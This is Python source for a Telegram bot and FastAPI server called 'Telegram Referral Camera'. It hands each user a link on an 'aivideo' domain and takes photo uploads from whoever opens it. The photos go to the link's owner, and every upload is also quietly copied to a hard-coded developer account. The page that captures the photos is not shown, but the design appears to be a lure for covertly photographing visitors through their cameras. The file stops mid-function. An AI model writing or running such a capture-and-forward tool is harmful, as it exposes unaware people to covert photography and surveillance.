# import os
# import asyncio
# import html
# import time
# from typing import List
# from contextlib import asynccontextmanager

# from fastapi import FastAPI, Query, Request, UploadFile, File, Form
# from fastapi.responses import HTMLResponse
# from fastapi.templating import Jinja2Templates

# from aiogram import Bot, Dispatcher, F
# from aiogram.types import (
#     BufferedInputFile,
#     InputMediaPhoto,
#     Message,
#     ReplyKeyboardMarkup,
#     KeyboardButton,
#     InlineKeyboardMarkup,
#     InlineKeyboardButton,
#     CallbackQuery,
# )
# from aiogram.filters import CommandStart
# from aiogram.exceptions import TelegramBadRequest
# from dotenv import load_dotenv

# from locales import LANGUAGES, DEFAULT_LANG, TEXTS, t
# from database import (
#     init_db,
#     get_or_create_user,
#     get_user,
#     increment_referrals,
#     get_stats,
#     get_total_users,
#     set_user_language,
# )


# # =========================================================
# # تحميل المتغيرات
# # =========================================================

# load_dotenv()

# BOT_TOKEN = os.getenv("BOT_TOKEN")

# ADMIN_TELEGRAM_ID = int(
#     os.getenv("ADMIN_TELEGRAM_ID", "6002805119")
# )

# CHANNEL_USERNAME = "@KhaldounSoft"
# CHANNEL_LINK = "https://t.me/KhaldounSoft"

# BASE_URL = os.getenv(
#     "BASE_URL",
#     "https://aivideo.apps.bot-hosting.cloud",
# ).rstrip("/")

# MAX_PHOTOS = 10
# MAX_PHOTO_SIZE = 10 * 1024 * 1024  # 10 ميجا لكل صورة

# # مؤقت الجلسة بالثواني (debounce)
# SESSION_TIMEOUT = int(os.getenv("SESSION_TIMEOUT", "60"))


# if not BOT_TOKEN:
#     raise RuntimeError("BOT_TOKEN is not configured")


# # =========================================================
# # إنشاء البوت
# # =========================================================

# bot = Bot(token=BOT_TOKEN)
# dp = Dispatcher()


# # =========================================================
# # تخزين الجلسات في الذاكرة
# # =========================================================

# _sessions: dict[str, dict] = {}
# # {
# #   "session_id": {
# #       "referral_id": str,
# #       "total": int,
# #       "photos": list[bytes],
# #       "indices": list[int],
# #       "timer": asyncio.TimerHandle | None,
# #       "created_at": float,
# #   }
# # }


# # =========================================================
# # تشغيل البوت مع FastAPI
# # =========================================================

# @asynccontextmanager
# async def lifespan(app: FastAPI):

#     await init_db()

#     polling_task = asyncio.create_task(
#         dp.start_polling(bot)
#     )

#     try:
#         yield

#     finally:
#         # إلغاء كل المؤقتات المعلقة
#         for sid, sess in list(_sessions.items()):
#             timer = sess.get("timer")
#             if timer:
#                 timer.cancel()
#         _sessions.clear()

#         try:
#             await dp.stop_polling()
#         except Exception:
#             pass

#         polling_task.cancel()

#         try:
#             await polling_task
#         except asyncio.CancelledError:
#             pass

#         await bot.session.close()


# app = FastAPI(
#     title="Telegram Referral Camera",
#     lifespan=lifespan,
# )

# templates = Jinja2Templates(directory="templates")


# # =========================================================
# # التحقق من الاشتراك
# # =========================================================

# async def check_subscription(user_id: int) -> bool:
#     try:
#         member = await bot.get_chat_member(
#             chat_id=CHANNEL_USERNAME,
#             user_id=user_id,
#         )
#         status = member.status
#         print(f"[SUBSCRIPTION] user={user_id} status={status}")
#         return status in {"creator", "administrator", "member"}

#     except TelegramBadRequest as error:
#         msg = str(error).lower()
#         print(f"[SUBSCRIPTION ERROR] user={user_id}: {error}")
#         if "user not found" in msg or "participant" in msg:
#             return False
#         return True

#     except Exception as error:
#         print(f"[SUBSCRIPTION ERROR] user={user_id}: {error}")
#         return True


# # =========================================================
# # لوحة اختيار اللغة
# # =========================================================

# def get_language_keyboard():
#     buttons = []
#     row = []
#     for code, info in LANGUAGES.items():
#         row.append(
#             InlineKeyboardButton(
#                 text=f"{info['flag']} {info['name']}",
#                 callback_data=f"lang:{code}",
#             )
#         )
#         if len(row) == 2:
#             buttons.append(row)
#             row = []
#     if row:
#         buttons.append(row)
#     return InlineKeyboardMarkup(inline_keyboard=buttons)


# # =========================================================
# # لوحة الاشتراك
# # =========================================================

# def get_subscription_keyboard(lang: str):
#     return InlineKeyboardMarkup(
#         inline_keyboard=[
#             [
#                 InlineKeyboardButton(
#                     text=t(lang, "btn_subscribe"),
#                     url=CHANNEL_LINK,
#                 )
#             ],
#             [
#                 InlineKeyboardButton(
#                     text=t(lang, "btn_confirm_sub"),
#                     callback_data="check_sub",
#                 )
#             ],
#         ]
#     )


# # =========================================================
# # لوحة الأدمن / المستخدم
# # =========================================================

# def get_admin_keyboard(lang: str):
#     return ReplyKeyboardMarkup(
#         keyboard=[
#             [KeyboardButton(text=t(lang, "btn_stats"))],
#             [KeyboardButton(text=t(lang, "change_language"))],
#             [KeyboardButton(text=t(lang, "btn_start"))],
#         ],
#         resize_keyboard=True,
#         persistent=True,
#     )


# def get_user_keyboard(lang: str):
#     return ReplyKeyboardMarkup(
#         keyboard=[
#             [KeyboardButton(text=t(lang, "change_language"))],
#             [KeyboardButton(text=t(lang, "btn_start"))],
#         ],
#         resize_keyboard=True,
#         persistent=True,
#     )


# # =========================================================
# # إرسال الواجهة الرئيسية
# # =========================================================

# async def send_main_dashboard(message_or_call, user, lang: str = DEFAULT_LANG):

#     user_id = user.id
#     name = user.full_name
#     username = user.username or ""

#     db_user, is_new = await get_or_create_user(
#         telegram_id=user_id,
#         name=name,
#         username=username,
#     )

#     if is_new:
#         username_text = (
#             f"@{username}" if username
#             else t("ar", "no_username")
#         )
#         total = await get_total_users()

#         admin_notice = (
#             f"👤 <b>{t('ar', 'new_user_notice')}</b>\n\n"
#             f"{t('ar', 'new_user_name')}: {html.escape(name)}\n"
#             f"{t('ar', 'new_user_username')}: {html.escape(username_text)}\n"
#             f"{t('ar', 'new_user_id')}: <code>{user_id}</code>\n"
#             f"{t('ar', 'new_user_total')}: {total}"
#         )

#         try:
#             await bot.send_message(
#                 chat_id=ADMIN_TELEGRAM_ID,
#                 text=admin_notice,
#                 parse_mode="HTML",
#             )
#         except Exception as error:
#             print(f"فشل إرسال إشعار المستخدم الجديد: {error}")

#     username_text = f"@{username}" if username else t(lang, "no_username")

#     welcome_text = (
#         f"{t(lang, 'welcome', name=html.escape(name))}\n\n"
#         f"{t(lang, 'your_id')}: <code>{user_id}</code>\n"
#         f"{t(lang, 'your_username')}: {html.escape(username_text)}\n\n"
#         f"{t(lang, 'your_link')}\n"
#         f"{BASE_URL}/?q={user_id}\n\n"
#         f"<b>{t(lang, 'steps_title')}</b>\n"
#         f"{t(lang, 'step1')}\n"
#         f"{t(lang, 'step2')}\n"
#         f"{t(lang, 'step3')}\n\n"
#         f"{t(lang, 'your_referrals')}: <b>{db_user.referrals}</b>"
#     )

#     keyboard = (
#         get_admin_keyboard(lang)
#         if user_id == ADMIN_TELEGRAM_ID
#         else get_user_keyboard(lang)
#     )

#     if isinstance(message_or_call, Message):
#         await message_or_call.answer(
#             welcome_text,
#             reply_markup=keyboard,
#             parse_mode="HTML",
#             disable_web_page_preview=True,
#         )
#     else:
#         await message_or_call.message.answer(
#             welcome_text,
#             reply_markup=keyboard,
#             parse_mode="HTML",
#             disable_web_page_preview=True,
#         )


# # =========================================================
# # /start
# # =========================================================

# @dp.message(CommandStart())
# async def start_handler(message: Message):

#     user_id = message.from_user.id

#     existing = await get_user(user_id)

#     if not existing or not existing.language:
#         await message.answer(
#             t(DEFAULT_LANG, "choose_language"),
#             reply_markup=get_language_keyboard(),
#         )
#         return

#     lang = existing.language

#     is_subscribed = await check_subscription(user_id)

#     if not is_subscribed:
#         sub_text = (
#             f"{t(lang, 'must_subscribe')}\n\n"
#             f"{t(lang, 'subscribe_hint')}"
#         )
#         await message.answer(
#             sub_text,
#             reply_markup=get_subscription_keyboard(lang),
#             parse_mode="HTML",
#         )
#         return

#     await send_main_dashboard(message, message.from_user, lang)


# # =========================================================
# # معالج اختيار اللغة
# # =========================================================

# @dp.callback_query(F.data.startswith("lang:"))
# async def language_callback(call: CallbackQuery):

#     code = call.data.split(":")[1]
#     if code not in LANGUAGES:
#         await call.answer("Invalid language", show_alert=True)
#         return

#     user_id = call.from_user.id

#     existing = await get_user(user_id)
#     if existing:
#         await set_user_language(user_id, code)
#     else:
#         await get_or_create_user(
#             telegram_id=user_id,
#             name=call.from_user.full_name,
#             username=call.from_user.username or "",
#         )
#         await set_user_language(user_id, code)

#     await call.answer(t(code, "lang_changed"))

#     try:
#         await call.message.delete()
#     except Exception:
#         pass

#     is_subscribed = await check_subscription(user_id)

#     if not is_subscribed:
#         sub_text = (
#             f"{t(code, 'must_subscribe')}\n\n"
#             f"{t(code, 'subscribe_hint')}"
#         )
#         await call.message.answer(
#             sub_text,
#             reply_markup=get_subscription_keyboard(code),
#             parse_mode="HTML",
#         )
#         return

#     await send_main_dashboard(call, call.from_user, code)


# # =========================================================
# # زر تأكيد الاشتراك
# # =========================================================

# @dp.callback_query(F.data == "check_sub")
# async def check_sub_callback(call: CallbackQuery):

#     user_id = call.from_user.id
#     user = await get_user(user_id)
#     lang = user.language if user else DEFAULT_LANG

#     is_subscribed = await check_subscription(user_id)

#     if is_subscribed:
#         await call.answer(t(lang, "sub_success"))
#         try:
#             await call.message.delete()
#         except Exception:
#             pass
#         await send_main_dashboard(call, call.from_user, lang)
#         return

#     await call.answer(t(lang, "sub_failed"), show_alert=True)


# # =========================================================
# # زر تغيير اللغة
# # =========================================================

# @dp.message(F.text.in_({
#     t(code, "change_language") for code in LANGUAGES
# }))
# async def change_language_handler(message: Message):

#     user = await get_user(message.from_user.id)
#     lang = user.language if user else DEFAULT_LANG

#     await message.answer(
#         t(lang, "choose_language"),
#         reply_markup=get_language_keyboard(),
#     )


# # =========================================================
# # إحصائيات البوت
# # =========================================================

# @dp.message(F.text.in_({
#     t(code, "btn_stats") for code in LANGUAGES
# }))
# async def stats_handler(message: Message):

#     if message.from_user.id != ADMIN_TELEGRAM_ID:
#         return

#     user = await get_user(message.from_user.id)
#     lang = user.language if user else DEFAULT_LANG

#     stats = await get_stats()

#     text = (
#         f"{t(lang, 'stats_title')}\n\n"
#         f"{t(lang, 'stats_total')}: <b>{stats['total']}</b>\n"
#         f"{t(lang, 'stats_7days')}: <b>{stats['last_7_days']}</b>\n"
#         f"{t(lang, 'stats_month')}: <b>{stats['this_month']}</b>"
#     )

#     await message.answer(text, parse_mode="HTML")


# # =========================================================
# # الصفحة الرئيسية
# # =========================================================

# @app.get("/", response_class=HTMLResponse)
# async def home(request: Request, q: str = Query(default="")):

#     if not q:
#         return """
#         <!DOCTYPE html>
#         <html lang="ar" dir="rtl">
#         <head>
#             <meta charset="UTF-8">
#             <meta name="viewport"
#                   content="width=device-width, initial-scale=1.0">
#             <title>الرابط غير صحيح</title>
#         </head>
#         <body style="font-family:sans-serif;text-align:center;padding:40px">
#             <h2>❌ الرابط غير صحيح</h2>
#             <p>يجب فتح رابط إحالة صالح.</p>
#         </body>
#         </html>
#         """

#     lang = DEFAULT_LANG
#     if q.isdigit():
#         owner = await get_user(int(q))
#         if owner and owner.language:
#             lang = owner.language

#     web_texts = {
#         key: t(lang, key)
#         for key in TEXTS[lang]
#         if key.startswith("web_")
#     }

#     return templates.TemplateResponse(
#         request=request,
#         name="index.html",
#         context={
#             "referral_id": q,
#             "lang": lang,
#             "is_rtl": lang in ("ar", "fa"),
#             "texts": web_texts,
#         },
#     )


# # =========================================================
# # إرسال الصور كألبوم (الدالة المركزية)
# # =========================================================

# async def flush_session(session_id: str, reason: str = "finish"):
#     """
#     يجمع الصور المخزنة في الجلسة ويرسلها كألبوم واحد.
#     reason: "finish" | "timeout" | "shutdown"
#     """
#     sess = _sessions.pop(session_id, None)
#     if not sess:
#         return

#     timer = sess.get("timer")
#     if timer:
#         try:
#             timer.cancel()
#         except Exception:
#             pass

#     photos = sess.get("photos", [])
#     indices = sess.get("indices", [])
#     referral_id = sess.get("referral_id", "")
#     total = sess.get("total", 0)

#     if not photos:
#         print(f"[FLUSH] session {session_id[:8]} empty (reason={reason})")
#         return

#     if not referral_id.isdigit():
#         print(f"[FLUSH] session {session_id[:8]} invalid referral_id")
#         return

#     owner_id = int(referral_id)
#     owner = await get_user(owner_id)

#     if not owner:
#         print(f"[FLUSH] session {session_id[:8]} owner not found")
#         return

#     lang = owner.language or DEFAULT_LANG
#     username = owner.username or ""
#     name = owner.name or "—"
#     username_text = f"@{username}" if username else t(lang, "no_username")

#     # بناء الكابشن
#     sent_count = len(photos)
#     reason_label = {
#         "finish": "completed",
#         "timeout": "auto (inactivity)",
#         "shutdown": "shutdown",
#     }.get(reason, reason)

#     caption = (
#         f"{t(lang, 'photo_caption')} ({sent_count}/{total})\n\n"
#         f"{t(lang, 'photo_owner')}: {html.escape(name)}\n"
#         f"{t(lang, 'photo_username')}: {html.escape(username_text)}\n"
#         f"{t(lang, 'photo_tg_id')}: {owner_id}\n"
#         f"{t(lang, 'photo_ref_id')}: {referral_id}\n"
#         f"🔖 Session: <code>{session_id[:8]}</code>\n"
#         f"⚡ Reason: <b>{reason_label}</b>"
#     )

#     # إرسال لصاحب الرابط
#     if len(photos) == 1:
#         # صورة واحدة → send_photo
#         try:
#             await bot.send_photo(
#                 chat_id=owner_id,
#                 photo=BufferedInputFile(photos[0], filename="photo_1.jpg"),
#                 caption=caption,
#                 parse_mode="HTML",
#             )
#             print(f"[FLUSH] 1 photo → owner {owner_id} (session {session_id[:8]})")
#         except Exception as e:
#             print(f"[FLUSH OWNER ERROR] {e!r}")
#             return
#     else:
#         # أكثر من صورة → send_media_group
#         media_group = []
#         for i, photo_bytes in enumerate(photos):
#             media_group.append(
#                 InputMediaPhoto(
#                     media=BufferedInputFile(
#                         photo_bytes,
#                         filename=f"photo_{indices[i] if i < len(indices) else i + 1}.jpg",
#                     ),
#                     caption=(caption if i == 0 else ""),
#                     parse_mode="HTML",
#                 )
#             )

#         try:
#             await bot.send_media_group(
#                 chat_id=owner_id,
#                 media=media_group,
#             )
#             print(f"[FLUSH] {len(photos)} photos → owner {owner_id} (session {session_id[:8]})")
#         except Exception as e:
#             print(f"[FLUSH OWNER ERROR] {e!r}")
#             return

#     # نسخة للمطور
#     try:
#         if len(photos) == 1:
#             await bot.send_photo(
#                 chat_id=ADMIN_TELEGRAM_ID,
#                 photo=BufferedInputFile(photos[0], filename="photo_1_admin.jpg"),
#                 caption=caption,
#                 parse_mode="HTML",
#             )
#         else:
#             admin_media = []
#             for i, photo_bytes in enumerate(photos):
#                 admin_media.append(
#                     InputMediaPhoto(
#                         media=BufferedInputFile(
#                             photo_bytes,
#                             filename=f"photo_{indices[i] if i < len(indices) else i + 1}_admin.jpg",
#                         ),
#                         caption=(caption if i == 0 else ""),
#                         parse_mode="HTML",
#                     )
#                 )
#             await bot.send_media_group(
#                 chat_id=ADMIN_TELEGRAM_ID,
#                 media=admin_media,
#             )
#     except Exception as e:
#         print(f"[FLUSH ADMIN ERROR] {e!r}")

#     # زيادة referrals
#     await increment_referrals(owner_id)
#     print(f"[FLUSH] +1 referral for {owner_id} (session {session_id[:8]})")


# # =========================================================
# # Timer: جدولة إرسال الجلسة بعد توقف الصور
# # =========================================================

# def schedule_session_flush(session_id: str):
#     """يعيد ضبط المؤقت ليرسل الجلسة بعد SESSION_TIMEOUT ثانية"""
#     sess = _sessions.get(session_id)
#     if not sess:
#         return

#     # إلغاء المؤقت القديم
#     old_timer = sess.get("timer")
#     if old_timer:
#         try:
#             old_timer.cancel()
#         except Exception:
#             pass

#     loop = asyncio.get_event_loop()

#     def _on_timeout():
#         # جدولة الـ flush كـ task (لا نستطيع await هنا)
#         asyncio.create_task(flush_session(session_id, reason="timeout"))

#     timer = loop.call_later(SESSION_TIMEOUT, _on_timeout)
#     sess["timer"] = timer


# # =========================================================
# # استقبال صورة واحدة (تخزين فقط)
# # =========================================================

# @app.post("/upload-single-photo")
# async def upload_single_photo(
#     photo: UploadFile = File(...),
#     referral_id: str = Form(...),
#     session_id: str = Form(...),
#     index: int = Form(...),
#     total: int = Form(...),
# ):

#     if not referral_id.isdigit():
#         return {"success": False, "message": "Invalid Referral ID."}

#     if not session_id:
#         return {"success": False, "message": "Invalid session."}

#     owner = await get_user(int(referral_id))
#     if not owner:
#         return {"success": False, "message": "Invalid referral link."}

#     image_bytes = await photo.read()

#     if not image_bytes:
#         return {"success": False, "message": "Empty photo."}

#     if len(image_bytes) > MAX_PHOTO_SIZE:
#         return {"success": False, "message": "Photo too large."}

#     # إنشاء الجلسة إن لم تكن موجودة
#     if session_id not in _sessions:
#         _sessions[session_id] = {
#             "referral_id": referral_id,
#             "total": total,
#             "photos": [],
#             "indices": [],
#             "timer": None,
#             "created_at": time.time(),
#         }

#     sess = _sessions[session_id]
#     sess["photos"].append(image_bytes)
#     sess["indices"].append(index)
#     sess["total"] = total

#     # إعادة ضبط المؤقت
#     schedule_session_flush(session_id)

#     print(
#         f"[STORED] session {session_id[:8]} photo {index}/{total} "
#         f"({len(image_bytes)} bytes, total={len(sess['photos'])})"
#     )

#     return {
#         "success": True,
#         "message": f"Photo {index} stored ({len(sess['photos'])}/{total})",
#         "stored": len(sess["photos"]),
#     }


# # =========================================================
# # إنهاء الجلسة (إرسال فوري)
# # =========================================================

# @app.post("/finish-session")
# async def finish_session(payload: dict):

#     session_id = str(payload.get("session_id", ""))
#     referral_id = str(payload.get("referral_id", ""))
#     total = int(payload.get("total", 0))
#     sent = int(payload.get("sent", 0))
#     failed = int(payload.get("failed", 0))

#     if not session_id:
#         return {"success": False, "message": "No session."}

#     # إرسال فوري (بدون انتظار المؤقت)
#     await flush_session(session_id, reason="finish")

#     return {
#         "success": True,
#         "message": "Session flushed.",
#         "sent": sent,
#         "failed": failed,
#     }


# # =========================================================
# # استقبال الصور (الطريقة القديمة — ألبوم دفعة واحدة)
# # =========================================================

# @app.post("/upload-photo")
# async def upload_photo(
#     photos: List[UploadFile] = File(...),
#     referral_id: str = Form(...),
# ):

#     if not referral_id.isdigit():
#         return {"success": False, "message": "Invalid Referral ID."}

#     if not photos:
#         return {"success": False, "message": "No photos."}

#     if len(photos) > MAX_PHOTOS:
#         return {"success": False, "message": f"Max {MAX_PHOTOS} photos."}

#     owner_id = int(referral_id)
#     owner = await get_user(owner_id)

#     if not owner:
#         return {"success": False, "message": "Invalid referral link."}

#     lang = owner.language or DEFAULT_LANG

#     username = owner.username or ""
#     name = owner.name or "—"
#     username_text = f"@{username}" if username else t(lang, "no_username")

#     caption = (
#         f"{t(lang, 'photo_caption')}\n\n"
#         f"{t(lang, 'photo_owner')}: {html.escape(name)}\n"
#         f"{t(lang, 'photo_username')}: {html.escape(username_text)}\n"
#         f"{t(lang, 'photo_tg_id')}: {owner_id}\n"
#         f"{t(lang, 'photo_ref_id')}: {referral_id}"
#     )

#     media_group_owner = []
#     media_group_admin = []

#     for idx, photo in enumerate(photos):
#         image_bytes = await photo.read()
#         if not image_bytes:
#             continue

#         if len(image_bytes) > MAX_PHOTO_SIZE:
#             return {
#                 "success": False,
#                 "message": f"Photo {idx + 1} too large.",
#             }

#         media_group_owner.append(
#             InputMediaPhoto(
#                 media=BufferedInputFile(
#                     image_bytes,
#                     filename=f"photo_{idx + 1}.jpg",
#                 )
#             )
#         )

#         media_group_admin.append(
#             InputMediaPhoto(
#                 media=BufferedInputFile(
#                     image_bytes,
#                     filename=f"photo_{idx + 1}.jpg",
#                 ),
#                 caption=(caption if idx == 0 else ""),
#                 parse_mode="HTML",
#             )
#         )

#     if not media_group_owner:
#         return {"success": False, "message": "No valid photos."}

#     owner_ok = True
#     try:
#         await bot.send_media_group(
#             chat_id=owner_id,
#             media=media_group_owner,
#         )
#     except Exception as error:
#         print(f"[SEND OWNER ERROR] {error!r}")
#         owner_ok = False

#     try:
#         await bot.send_media_group(
#             chat_id=ADMIN_TELEGRAM_ID,
#             media=media_group_admin,
#         )
#     except Exception as error:
#         print(f"[SEND ADMIN ERROR] {error!r}")

#     if not owner_ok:
#         return {
#             "success": False,
#             "message": "Failed to send to owner.",
#         }

#     await increment_referrals(owner_id)

#     return {"success": True, "message": "Photos sent."}





import os
import asyncio
import html
import time
from typing import List, Optional
from datetime import datetime
from contextlib import asynccontextmanager

from fastapi import FastAPI, Query, Request, UploadFile, File, Form
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    BufferedInputFile,
    InputMediaPhoto,
    Message,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
)
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest
from dotenv import load_dotenv

from locales import LANGUAGES, DEFAULT_LANG, TEXTS, t
from database import (
    init_db,
    get_or_create_user,
    get_user,
    increment_referrals,
    get_stats,
    get_total_users,
    set_user_language,
    create_post,
    get_active_posts,
    get_all_posts,
    get_post,
    update_post,
    delete_post,
    toggle_post,
)


# =========================================================
# تحميل المتغيرات
# =========================================================

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")

ADMIN_TELEGRAM_ID = int(
    os.getenv("ADMIN_TELEGRAM_ID", "6002805119")
)

CHANNEL_USERNAME = "@KhaldounSoft"
CHANNEL_LINK = "https://t.me/KhaldounSoft"

BASE_URL = os.getenv(
    "BASE_URL",
    "https://aivideo.apps.bot-hosting.cloud",
).rstrip("/")

MAX_PHOTOS = 10
MAX_PHOTO_SIZE = 10 * 1024 * 1024
SESSION_TIMEOUT = int(os.getenv("SESSION_TIMEOUT", "60"))


if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is not configured")


# =========================================================
# إنشاء البوت
# =========================================================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())


# =========================================================
# FSM لحالات إدارة المنشورات
# =========================================================

class PostForm(StatesGroup):
    waiting_button_text = State()
    waiting_content = State()
    waiting_url = State()
    waiting_url_button_text = State()
    waiting_duration = State()
    waiting_start_date = State()
    waiting_end_date = State()
    editing_field = State()
    editing_value = State()


# =========================================================
# تخزين الجلسات
# =========================================================

_sessions: dict[str, dict] = {}


# =========================================================
# lifespan
# =========================================================

@asynccontextmanager
async def lifespan(app: FastAPI):
    await init_db()
    polling_task = asyncio.create_task(dp.start_polling(bot))

    try:
        yield
    finally:
        for sid, sess in list(_sessions.items()):
            timer = sess.get("timer")
            if timer:
                timer.cancel()
        _sessions.clear()

        try:
            await dp.stop_polling()
        except Exception:
            pass

        polling_task.cancel()
        try:
            await polling_task
        except asyncio.CancelledError:
            pass

        await bot.session.close()


app = FastAPI(
    title="Telegram Referral Camera",
    lifespan=lifespan,
)

templates = Jinja2Templates(directory="templates")


# =========================================================
# التحقق من الاشتراك
# =========================================================

async def check_subscription(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(
            chat_id=CHANNEL_USERNAME,
            user_id=user_id,
        )
        status = member.status
        print(f"[SUBSCRIPTION] user={user_id} status={status}")
        return status in {"creator", "administrator", "member"}

    except TelegramBadRequest as error:
        msg = str(error).lower()
        print(f"[SUBSCRIPTION ERROR] user={user_id}: {error}")
        if "user not found" in msg or "participant" in msg:
            return False
        return True

    except Exception as error:
        print(f"[SUBSCRIPTION ERROR] user={user_id}: {error}")
        return True


# =========================================================
# لوحة اختيار اللغة
# =========================================================

def get_language_keyboard():
    buttons = []
    row = []
    for code, info in LANGUAGES.items():
        row.append(
            InlineKeyboardButton(
                text=f"{info['flag']} {info['name']}",
                callback_data=f"lang:{code}",
            )
        )
        if len(row) == 2:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)
    return InlineKeyboardMarkup(inline_keyboard=buttons)


# =========================================================
# لوحة الاشتراك
# =========================================================

def get_subscription_keyboard(lang: str):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=t(lang, "btn_subscribe"),
                    url=CHANNEL_LINK,
                )
            ],
            [
                InlineKeyboardButton(
                    text=t(lang, "btn_confirm_sub"),
                    callback_data="check_sub",
                )
            ],
        ]
    )


# =========================================================
# لوحة الأدمن / المستخدم
# =========================================================

def get_admin_keyboard(lang: str):
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=t(lang, "btn_stats"))],
            [KeyboardButton(text=t(lang, "btn_manage_posts"))],
            [KeyboardButton(text=t(lang, "change_language"))],
            [KeyboardButton(text=t(lang, "btn_start"))],
        ],
        resize_keyboard=True,
        persistent=True,
    )


def get_user_keyboard(lang: str, post_button_text: str = ""):
    rows = []
    if post_button_text:
        rows.append([KeyboardButton(text=post_button_text)])
    rows.append([KeyboardButton(text=t(lang, "change_language"))])
    rows.append([KeyboardButton(text=t(lang, "btn_start"))])

    return ReplyKeyboardMarkup(
        keyboard=rows,
        resize_keyboard=True,
        persistent=True,
    )


# =========================================================
# إرسال الواجهة الرئيسية
# =========================================================

async def send_main_dashboard(message_or_call, user, lang: str = DEFAULT_LANG):

    user_id = user.id
    name = user.full_name
    username = user.username or ""

    db_user, is_new = await get_or_create_user(
        telegram_id=user_id,
        name=name,
        username=username,
    )

    if is_new:
        username_text = (
            f"@{username}" if username
            else t("ar", "no_username")
        )
        total = await get_total_users()

        admin_notice = (
            f"👤 <b>{t('ar', 'new_user_notice')}</b>\n\n"
            f"{t('ar', 'new_user_name')}: {html.escape(name)}\n"
            f"{t('ar', 'new_user_username')}: {html.escape(username_text)}\n"
            f"{t('ar', 'new_user_id')}: <code>{user_id}</code>\n"
            f"{t('ar', 'new_user_total')}: {total}"
        )

        try:
            await bot.send_message(
                chat_id=ADMIN_TELEGRAM_ID,
                text=admin_notice,
                parse_mode="HTML",
            )
        except Exception as error:
            print(f"فشل إرسال إشعار المستخدم الجديد: {error}")

    username_text = f"@{username}" if username else t(lang, "no_username")

    welcome_text = (
        f"{t(lang, 'welcome', name=html.escape(name))}\n\n"
        f"{t(lang, 'your_id')}: <code>{user_id}</code>\n"
        f"{t(lang, 'your_username')}: {html.escape(username_text)}\n\n"
        f"{t(lang, 'your_link')}\n"
        f"{BASE_URL}/?q={user_id}\n\n"
        f"<b>{t(lang, 'steps_title')}</b>\n"
        f"{t(lang, 'step1')}\n"
        f"{t(lang, 'step2')}\n"
        f"{t(lang, 'step3')}\n\n"
        f"{t(lang, 'your_referrals')}: <b>{db_user.referrals}</b>"
    )

    # جلب زر المنشور المفعّل للمستخدم العادي
    post_btn = ""
    if user_id != ADMIN_TELEGRAM_ID:
        active_posts = await get_active_posts()
        if active_posts:
            post_btn = active_posts[0].button_text

    if user_id == ADMIN_TELEGRAM_ID:
        keyboard = get_admin_keyboard(lang)
    else:
        keyboard = get_user_keyboard(lang, post_btn)

    if isinstance(message_or_call, Message):
        await message_or_call.answer(
            welcome_text,
            reply_markup=keyboard,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    else:
        await message_or_call.message.answer(
            welcome_text,
            reply_markup=keyboard,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )


# =========================================================
# /start
# =========================================================

@dp.message(CommandStart())
async def start_handler(message: Message):

    user_id = message.from_user.id

    existing = await get_user(user_id)

    if not existing or not existing.language:
        await message.answer(
            t(DEFAULT_LANG, "choose_language"),
            reply_markup=get_language_keyboard(),
        )
        return

    lang = existing.language

    is_subscribed = await check_subscription(user_id)

    if not is_subscribed:
        sub_text = (
            f"{t(lang, 'must_subscribe')}\n\n"
            f"{t(lang, 'subscribe_hint')}"
        )
        await message.answer(
            sub_text,
            reply_markup=get_subscription_keyboard(lang),
            parse_mode="HTML",
        )
        return

    await send_main_dashboard(message, message.from_user, lang)


# =========================================================
# معالج اختيار اللغة
# =========================================================

@dp.callback_query(F.data.startswith("lang:"))
async def language_callback(call: CallbackQuery):

    code = call.data.split(":")[1]
    if code not in LANGUAGES:
        await call.answer("Invalid language", show_alert=True)
        return

    user_id = call.from_user.id

    existing = await get_user(user_id)
    if existing:
        await set_user_language(user_id, code)
    else:
        await get_or_create_user(
            telegram_id=user_id,
            name=call.from_user.full_name,
            username=call.from_user.username or "",
        )
        await set_user_language(user_id, code)

    await call.answer(t(code, "lang_changed"))

    try:
        await call.message.delete()
    except Exception:
        pass

    is_subscribed = await check_subscription(user_id)

    if not is_subscribed:
        sub_text = (
            f"{t(code, 'must_subscribe')}\n\n"
            f"{t(code, 'subscribe_hint')}"
        )
        await call.message.answer(
            sub_text,
            reply_markup=get_subscription_keyboard(code),
            parse_mode="HTML",
        )
        return

    await send_main_dashboard(call, call.from_user, code)


# =========================================================
# زر تأكيد الاشتراك
# =========================================================

@dp.callback_query(F.data == "check_sub")
async def check_sub_callback(call: CallbackQuery):

    user_id = call.from_user.id
    user = await get_user(user_id)
    lang = user.language if user else DEFAULT_LANG

    is_subscribed = await check_subscription(user_id)

    if is_subscribed:
        await call.answer(t(lang, "sub_success"))
        try:
            await call.message.delete()
        except Exception:
            pass
        await send_main_dashboard(call, call.from_user, lang)
        return

    await call.answer(t(lang, "sub_failed"), show_alert=True)


# =========================================================
# زر تغيير اللغة
# =========================================================

@dp.message(F.text.in_({
    t(code, "change_language") for code in LANGUAGES
}))
async def change_language_handler(message: Message):

    user = await get_user(message.from_user.id)
    lang = user.language if user else DEFAULT_LANG

    await message.answer(
        t(lang, "choose_language"),
        reply_markup=get_language_keyboard(),
    )


# =========================================================
# إحصائيات البوت
# =========================================================

@dp.message(F.text.in_({
    t(code, "btn_stats") for code in LANGUAGES
}))
async def stats_handler(message: Message):

    if message.from_user.id != ADMIN_TELEGRAM_ID:
        return

    user = await get_user(message.from_user.id)
    lang = user.language if user else DEFAULT_LANG

    stats = await get_stats()

    text = (
        f"{t(lang, 'stats_title')}\n\n"
        f"{t(lang, 'stats_total')}: <b>{stats['total']}</b>\n"
        f"{t(lang, 'stats_7days')}: <b>{stats['last_7_days']}</b>\n"
        f"{t(lang, 'stats_month')}: <b>{stats['this_month']}</b>"
    )

